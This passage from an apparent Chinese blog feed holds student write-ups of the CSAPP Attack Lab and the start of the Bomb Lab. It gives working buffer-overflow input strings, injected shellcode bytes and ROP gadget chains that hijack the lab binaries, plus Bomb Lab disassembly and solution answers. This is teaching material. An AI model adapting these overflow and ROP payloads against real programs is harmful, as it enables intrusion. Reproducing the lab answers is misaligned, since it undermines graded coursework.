class="language-assembly" data-language="assembly"><code class="language-assembly">Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:   48 8b 3c 25 e4 44 60    mov    0x6044e4,%rdi   7:   00    8:   68 ec 17 40 00          pushq  $0x4017ec   d:   c3                      retq</code></pre><p>另外，要想跳转到注入代码的位置，我们必须首先知道它的地址，由于 ctarget 没有使用 <strong>栈随机化（stack randomization）</strong> ，因此我们完全可以先借助 GDB 打印出调用 <code>Gets</code> 前的栈指针值，再根据注入代码相较于栈指针的偏移计算得到。</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p2-1.png"></p><p>最终的攻击数据如下所示：</p><pre class="language-none"><code class="language-none">48 8b 3c 25 e4 44 60 0068 ec 17 40 00 c3 00 003f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 00</code></pre><p>最后，想吐槽一点，Attack Lab 貌似没法 GDB 调试 <code>getbuf</code> ？没了调试，在一些简单的错误上面卡半天。。。</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p2-2.png"></p><h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><p>phase_3 和 phase_2 很类似，只不过参数由整数换成了字符串，不过思路都是大抵相同的。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">void touch3(char *sval)&#123;    vlevel &#x3D; 3; &#x2F;* Part of validation protocol *&#x2F;    if (hexmatch(cookie, sval)) &#123;    printf(&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);    validate(3);    &#125; else &#123;    printf(&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);    fail(3);    &#125;    exit(0);&#125;&#x2F;* Compare string to hex represention of unsigned value *&#x2F;int hexmatch(unsigned val, char *sval)&#123;    char cbuf[110];    &#x2F;* Make position of check string unpredictable *&#x2F;    char *s &#x3D; cbuf + random() % 100;    sprintf(s, &quot;%.8x&quot;, val);    return strncmp(sval, s, 9) &#x3D;&#x3D; 0;&#125;</code></pre><p>字符串相较于整数，无外乎多了一层 <strong>indirection</strong> ，也就是指针。我们只需要预先在某个地址 addr 处将字符串数据进行存储，后续将字符串参数设置为 addr 即可，同样，addr 的值可根据相对于栈的偏移量得到。</p><p>注入的代码如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:   48 c7 c7 88 dc 61 55    mov    $0x5561dc88,%rdi   7:   68 fa 18 40 00          pushq  $0x4018fa   c:   c3                      retq </code></pre><p>而字符串 <code>&quot;59b997fa&quot;</code> 的 ASCII 码表示为：<code>35 39 62 39 39 37 66 61 00</code>，最后的 <code>00</code> 表示 NULL，即 C 语言字符串的终结符。</p><p>这里我遇到了一点问题，这是错误的攻击数据：</p><pre class="language-none"><code class="language-none">48 c7 c7 88 dc 61 55 68fa 18 40 00 c3 00 00 00 35 39 62 39 39 37 66 6100 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 00</code></pre><p>上面的答案看似没有问题，但是实际上忽略了很重要的一点，字符串的值存放在 <code>getbuf</code> 的栈帧中（<code>0x5561dc78 ~ 0x5561dc98</code>），在完成字符串正确性检验之前，字符串的值都应该 <strong>保持不变</strong> 。而实际上在函数 <code>getbuf</code> 返回后，它的栈帧空间将会被回收，留给 <code>touch3</code> 和 <code>hexmatch</code> 分配使用，且观察反汇编代码发现分配给 <code>hexmatch</code> 的栈帧空间大于 40 字节，这必然导致 <code>getbuf</code> 栈帧数据被破坏，也就导致了错误。 </p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p3-1.png"></p><p>一种正确的方式是将字符串数据写入 <code>test</code> 栈帧或更高地址处，因为实验只要求成功触发 touch，而并不要求正确返回到之前的调用过程，因此破坏之前的栈帧对结果无影响。</p><pre class="language-none"><code class="language-none">48 c7 c7 a8 dc 61 55 68fa 18 40 00 c3 00 00 003f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 0035 39 62 39 39 37 66 6100</code></pre><p><img src="/2024/09/25/CSAPP-Attack-Lab/p3-2.png"></p><h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><p>后面的两个实验需要攻击程序是 rtarget，相较于 ctarget，它引入了很多安全措施，例如栈随机化、限制可执行代码区域等，因此攻击起来更为困难。</p><p>参考实验手册，其中介绍了一种很有意思的攻击方法：不手动注入代码，而是借助已存在的代码，将其重组为我们需要的攻击代码。其中，一个以 <code>ret</code> 指令结束的指令序列，称之为一个 gadget，一连串的 gadget 被调用将会产生等价于代码注入的效果。</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p4-1.png"></p><p>想法很美好，但是实施起来的过程还是比较痛苦的，要想组合出有效的 gadget，需要仔细对照指令的字节表示和 <code>farm</code> 的反汇编代码，这部分我也是大量 <del>抄袭了</del> 参考了其他人的做法。</p><p>一种正确的 gadget 组合如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly"># gadget100000000004019ab &lt;addval_219 + 4&gt;:58  pop %rax90  nopc3  ret# gadget200000000004019c5 &lt;setval_426 + 2&gt;:48 89 c7  movq %rax,%rdi90        nopc3  ret</code></pre><p>返回地址为 <code>0x4019ab</code>，即 gadget1 的起始地址，然后栈中从低到高依次存放：cookie 的值、gadget2 的起始地址、<code>touch2</code> 的起始地址。 </p><blockquote><p>这里要注意出栈是从低地址向高地址方向，与入栈相反。</p></blockquote><p>最终的攻击数据如下：</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fab 19 40 00 00 00 00 00fa 97 b9 59 00 00 00 00c5 19 40 00 00 00 00 00ec 17 40 00 00 00 00 00</code></pre><h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><p>最后 phase_5 的 gadget 构造非常复杂（官解是用了 8 个），在 CMU 的实验中也是属于选做的部分，完成前四个已经有 95 分了，因此这里也只介绍一些问题和思路。</p><p>前面提到，rtarget 引入了栈随机化，这会带来的问题是：在指定参数 sval 时，无法显式地指定地址，而需要依靠间接寻址，即栈指针 <code>%rsp</code> 加上一个相较于它的偏移量。我们可以先确定哪条指令根据栈指针的值计算字符串参数，记录下它的位置和字符串存放位置的偏移量，作为数据一并存入栈中，后续再取出进行计算。</p><p>以下是一种正确的 gadget 实现：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly"># gadget100000000004019ab &lt;addval_219 + 4&gt;:58  pop %rax90  nopc3  ret# gadget200000000004019dd &lt;getval_481 + 2&gt;:89 c2   movl %eax,%edx90nopc3ret# gadget30000000000401a69 &lt;getval_481 + 1&gt;:89 d1   movl %edx,%ecx08 dborb  %bl,%blc3ret# gadget40000000000401a13 &lt;addval_436 + 2&gt;:89 ce   movl %ecx,%esi90nop90nopc3ret# gadget50000000000401aad &lt;setval_350 + 2&gt;:48 89 e0  movq %rsp,%rax90  nopc3  ret# gadget600000000004019a2 &lt;addval_273 + 2&gt;:48 89 c7  movq %rax,%rdic3  ret# gadget700000000004019d6 &lt;add_xy&gt;:48 8d 04 37  lea  (%rdi,%rsi,1),%raxc3 ret# gadget800000000004019a2 &lt;addval_273 + 2&gt;:48 89 c7  movq %rax,%rdic3  ret</code></pre><p>攻击数据的构造和 phase_4 很类似，就不过多赘述了。</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fab 19 40 00 00 00 00 0020 00 00 00 00 00 00 00dd 19 40 00 00 00 00 0069 1a 40 00 00 00 00 0013 1a 40 00 00 00 00 00ad 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40 00 00 00 00 0035 39 62 39 39 37 66 6100</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;个人感觉非常有意思的一个 Lab，涉及的知识面比较窄，主要关注 &lt;strong&gt;缓冲区溢出漏洞&lt;/strong&gt; 这一个方面，并基于此进行代码攻击，体验一把做黑客的感觉，对应知识点为书中的 3.10 节内容。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="汇编语言" scheme="http://lordaeronesz.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Bomb Lab</title>
    <link href="http://lordaeronesz.github.io/2024/09/17/CSAPP-Bomb-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/09/17/CSAPP-Bomb-Lab/</id>
    <published>2024-09-17T03:45:11.000Z</published>
    <updated>2024-09-19T06:46:56.785Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>本 Lab 可以说是 CSAPP 的几个 Lab 中最为人津津乐道的一个，对应知识点为书中的第 3 章（程序的机器级表示），要求使用 GDB 调试器，对汇编语言进行调试，从而得出正确的“拆弹密码”。共分为 6 个关卡和一个隐藏关卡，每个关卡都分别考察了一种语法结构或数据结构的汇编表示，部分关卡逻辑比较复杂，要求对 x86 汇编有一定的熟悉度。</p><h1 id="bomb-c"><a href="#bomb-c" class="headerlink" title="bomb.c"></a>bomb.c</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">;</span>    <span class="token comment">/* Note to self: remember to port this bomb to Windows and put a     * fantastic GUI on it. */</span>    <span class="token comment">/* When run with no arguments, the bomb reads its input lines     * from standard input. */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        infile <span class="token operator">=</span> <span class="token constant">stdin</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* When run with one argument &lt;file>, the bomb reads from &lt;file>     * until EOF, and then switches to standard input. Thus, as you     * defuse each phase, you can add its defusing string to &lt;file> and     * avoid having to retype it. */</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>infile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: Error: Couldn't open %s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* You can't call the bomb with more than 1 command line argument. */</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s [&lt;input_file>]\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* Do all sorts of secret stuff that makes the bomb harder to defuse. */</span>    <span class="token function">initialize_bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to my fiendish little bomb. You have 6 phases with\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"which to blow yourself up. Have a nice day!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Hmm...  Six phases must be more secure than one phase! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">/* Get input                   */</span>    <span class="token function">phase_1</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">/* Run the phase               */</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">/* Drat!  They figured it out!                                      * Let me know how they did it. */</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Phase 1 defused. How about the next one?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* The second phase is harder.  No one will ever figure out     * how to defuse this... */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_2</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"That's number 2.  Keep going!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* I guess this is too easy so far.  Some more complex code will     * confuse people. */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_3</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Halfway there!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_4</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"So you got that one.  Try this one.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Round and 'round in memory we go, where we stop, the bomb blows! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_5</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Good work!  On to the next...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* This phase will never be used, since no one will get past the     * earlier ones.  But just in case, make this one extra hard. */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_6</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Wow, they got it!  But isn't something... missing?  Perhaps     * something they overlooked?  Mua ha ha ha ha! */</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>首先观察 <code>bomb.c</code> 的 main 函数结构，最开始判断 argc 是否为 1，如果为 1，表示运行 bomb 程序时没有指定命令行参数，即从标准输入中读取 “拆弹密码”；否则，从指定的文件中读取。为了后续调试的方便，可以将所有的密码写入一个文件 <code>ans.txt</code> 中，后续在启动 bomb 程序时对其指定：<code>./bomb ans.txt</code>.</p><p>随后便是初始化“炸弹”，每次读取一行密码，利用该密码进行“拆弹”，如果正确，则进入下一关卡，否则，“炸弹”就会爆炸，“拆弹”失败。一次性输对 6 个密码后，“炸弹”就会被“拆除”。</p><p>注意最后的注释：</p><blockquote><p>Wow, they got it!  But isn’t something… missing?  Perhaps something they overlooked?  Mua ha ha ha ha!</p></blockquote><p>一定程度上暗示了隐藏关卡的存在。</p><h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p>每次拆弹时，可以使用 <code>disas</code> 命令进行反汇编，查看函数对应的汇编代码，以下是 <code>disas phase_1</code> 的结果：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi0x0000000000400ee9 &lt;+9&gt;:     call   0x401338 &lt;strings_not_equal&gt;0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;0x0000000000400ef2 &lt;+18&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp0x0000000000400efb &lt;+27&gt;:    ret</code></pre><p>热身关卡，代码的逻辑很简单，读取一行密码，判断该密码与事先指定的字符串是否相同，如果不相同，则“引爆炸弹”。</p><p>这里需要熟悉 x86 寄存器的使用惯例（也可以 GDB 自行调试），寄存器 <code>%rdi</code> 寄存器 <code>%rsi</code> 分别作为函数调用时的参数 1 和参数 2。在这里，<code>%rdi</code> 存储着读取到的密码字符串（准确来说，是字符串首字母的地址），而 <code>%rsi</code> 则被赋值为 <code>0x402400</code>，然后，将这两个地址作为参数 1 和参数 2，调用 <code>string_not_equal</code>，从函数名称上看，该函数用来判定两个字符串是否相同。那么思路就很清晰了，密码就是地址 <code>0x402400</code> 处的字符串值，使用 <code>x/s 0x402400</code> 查看即可。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p1.png"></p><h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400efc &lt;+0&gt;:     push   %rbp0x0000000000400efd &lt;+1&gt;:     push   %rbx0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi0x0000000000400f05 &lt;+9&gt;:     call   0x40145c &lt;read_six_numbers&gt;0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;0x0000000000400f10 &lt;+20&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;0x0000000000400f20 &lt;+36&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp0x0000000000400f40 &lt;+68&gt;:    pop    %rbx0x0000000000400f41 &lt;+69&gt;:    pop    %rbp0x0000000000400f42 &lt;+70&gt;:    ret</code></pre><p>这一关主要是考察 <strong>循环语句</strong> ，可以仔细阅读书中第 3.6.7 节，加强对汇编的循环结构的熟悉程度，如果感觉思路很乱，可以采用与书中类似的方法：先将汇编翻译为等价的带 goto 的高级语言，再参考几种典型的循环形式，将 goto 改写为循环结构，以下便是最终翻译得到的类 C 语言伪代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">read_six_numbers();if (Mem[%rsp] !&#x3D; 1) &#123;    explode_bomb();&#125;for (%rbx &#x3D; %rsp + 4, %rbp &#x3D; %rsp + 24; %rbx !&#x3D; %rbp; %rbx +&#x3D; 4) &#123;    %eax &#x3D; Mem[%rbx - 4];  &#x2F;&#x2F; 上一个元素    %eax *&#x3D; 2;    if (Mem[%rbx] !&#x3D; %eax) &#123;        explode_bomb();    &#125;&#125;</code></pre><p>首先注意到 <code>read_six_numbers()</code> 函数，字面意思是读取 6 个数字，推测密码由 6 个数字组成。</p><p>然后判断 <code>Mem[%rsp]</code> 的值是否为 1，不是则“爆炸”。这里可以善用 GDB，先随便蒙 6 个数字，然后使用 <code>p/x</code> 打印 <code>Mem[%rsp]</code> 的值，发现其值正好等于输入的第一个数字，结合后面的 6 次循环可知，输入的第 i （i 从 0 开始）个数字存储在地址 <code>%rsp + 4 * i</code> 处，且每个数字都必须为它前一个数字的两倍。</p><p>那么代码逻辑便理清楚了：输入的第一个数字为 1，其后每一个数字都为前一个数字的两倍，密码为：<code>1 2 4 8 16 32</code>.</p><h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax0x0000000000400f5b &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;0x0000000000400f65 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax0x0000000000400f75 &lt;+50&gt;:    jmp    *0x402470(,%rax,8)0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fad &lt;+106&gt;:   call   0x40143a &lt;explode_bomb&gt;0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;0x0000000000400fc4 &lt;+129&gt;:   call   0x40143a &lt;explode_bomb&gt;0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp0x0000000000400fcd &lt;+138&gt;:   ret</code></pre><p>这一关的代码量比较大，但是中间一段看起来很有规律，尤其注意这一句：<code>jmp  *0x402470(, %rax, 8)</code>，直接根据 <code>%rax</code> 寄存器的值计算偏移量进行跳转，这便是 <strong>switch 语句</strong> 所采用的跳转方式，地址 <code>0x402470</code> 即跳转表的首地址。</p><p>另外，还需要关注的一条指令是 <code>call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;</code>，貌似是一个函数调用指令，以下是我借助大语言模型得到的解释：</p><blockquote><p><code>__isoc99_sscanf@plt</code> 是一个指向 <code>sscanf</code> 函数的 PLT（Procedure Linkage Table）入口点的符号引用。<code>sscanf</code> 函数是 C 语言标准库中的一个函数，用于从输入流中按照指定格式读取数据。<code>@plt</code> 表示这是一个通过动态链接的程序跳转表（Procedure Linkage Table）来调用的函数。</p><h3 id="参数传递"><a href="#参数传递" class="headerlink" title="参数传递"></a>参数传递</h3><p>在 x86-64 架构中，函数参数通常是通过寄存器传递的。对于 <code>sscanf</code> 函数，它的参数如下：</p><ul><li><code>%rdi</code>：第一个参数，通常是文件描述符或指针类型。对于 <code>sscanf</code>，这是指向输入字符串的指针。</li><li><code>%rsi</code>：第二个参数，指向格式化字符串的指针。</li><li><code>%rdx</code>：第三个参数，如果有的话，指向第一个要填充的变量的地址。</li><li>更多的参数会继续使用后续的寄存器 <code>%rcx</code>, <code>%r8</code>, 和 <code>%r9</code>。如果参数超过六个，那么它们将会通过栈传递。</li></ul><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>在 x86-64 架构中，返回值会被放在 <code>%rax</code> 寄存器中。<code>sscanf</code> 返回成功匹配和赋值的项数，如果没有任何匹配，则返回零。如果输入结束前格式化字符串就被耗尽了，也返回零。如果遇到任何读取错误（如读取一个整数但输入不是有效的整数），则返回负数。</p></blockquote><p>简而言之，<code>sscanf</code> 类似于 <code>scanf</code>，只是输入从标准输入变成了指定的字符串。在这里，<code>sscanf</code> 指定了 4 个参数，作用为：从 <code>%rdi</code> 寄存器指向的字符串中进行读取，<code>%rsi</code> 指向格式化字符串，<code>%rdx</code> 和 <code>%rcx</code> 分别指向被格式化读取到的变量 1 和变量 2. 若读取成功，则返回成功读取的项数，即为 2，存入 <code>%rax</code> 寄存器中。</p><p>查看 <code>0x4025cf</code> 处的字符串，即格式化字符串，为 <code>%d %d</code>，说明读取的两个值都为十进制整数，即本关密码的形式。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p3.png"></p><p>最后查看一下整张跳转表的值，根据最终跳转到的位置确定输入的值。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p3-2.png"></p><p>然后将其改写为 switch 语句，下面直接给出完整代码的翻译结果：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">%rcx &#x3D; %rsp + 12;%rdx &#x3D; %rsp + 8;%esi &#x3D; 0x4025cf;%eax &#x3D; 0;sscanf(%rdi, %rsi, %rdx, %rcx);if (%eax &lt;&#x3D; 1) &#123;          &#x2F;&#x2F; 读取成功的值个数小于2    explode_bomb();&#125;if (Mem[%rsp + 8] &gt; 7u) &#123; &#x2F;&#x2F; 读取到的（输入的）第一个值大于7或小于0    explode_bomb();&#125;%eax &#x3D; Mem[%rsp + 8];switch (%rax) &#123;    case 0:        %eax &#x3D; 0xcf;  break;    case 1:        %eax &#x3D; 0x137; break;    case 2:        %eax &#x3D; 0x2c3; break;    case 3:        %eax &#x3D; 0x100; break;    case 4:        %eax &#x3D; 0x185; break;    case 5:        %eax &#x3D; 0xce;  break;    case 6:        %eax &#x3D; 0x2aa; break;    case 7:    %eax &#x3D; 0x147; break;&#125;&#x2F;&#x2F; 输入的第二个值等于%eax寄存器的值if (%eax !&#x3D; 